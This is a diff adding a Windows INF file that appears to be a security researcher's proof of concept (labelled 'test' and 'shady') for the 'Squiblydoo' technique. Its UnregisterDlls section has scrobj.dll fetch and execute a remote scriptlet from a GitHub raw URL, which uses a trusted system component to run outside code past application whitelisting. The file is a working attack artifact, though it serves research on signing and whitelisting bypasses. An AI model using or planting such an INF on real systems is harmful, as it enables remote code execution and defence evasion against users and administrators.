@@ -1,0 +1,33 @@
+; ----------------------------------------------------------------------
+; Required Sections
+; ----------------------------------------------------------------------
+[Version] 
+Signature=$CHICAGO$
+Provider=test
+ClassGuid={4d36e979-e325-11ce-bfc1-08002be10318}
+CatalogFile=shady.cat
+DriverVer=01/29/2010
+
+[Manufacturer]
+HuntressLabs=ModelsSection,NTx86,NTia64,NTamd64
+
+; ----------------------------------------------------------------------
+; Models Section
+; ----------------------------------------------------------------------
+[ModelsSection.NTx86]
+UnregisterDlls = Squiblydoo
+
+[ModelsSection.NTia64]
+UnregisterDlls = Squiblydoo
+
+[ModelsSection.NTamd64]
+UnregisterDlls = Squiblydoo
+
+; ----------------------------------------------------------------------
+; Support Sections
+; ----------------------------------------------------------------------
+[DefaultInstall]
+UnregisterDlls = Squiblydoo
+
+[Squiblydoo]
+11,,scrobj.dll,2,60,https://raw.githubusercontent.com/KyleHanslovan/inf_catalog_signing_poc/master/shady/shady.sct
